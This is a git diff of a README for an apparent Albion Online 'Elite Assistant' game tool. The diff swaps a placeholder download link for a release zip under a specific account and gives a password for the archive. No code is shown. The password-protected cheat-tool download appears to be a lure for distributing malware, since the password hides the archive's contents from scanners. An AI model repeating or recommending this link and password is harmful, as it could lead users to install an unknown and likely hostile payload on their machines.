@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Albion-Online-Elite-Assistant/releases/latest/download/Albion-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/davehlab98p4/Albion-Online-Elite-Assistant/releases/download/download/Albion_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
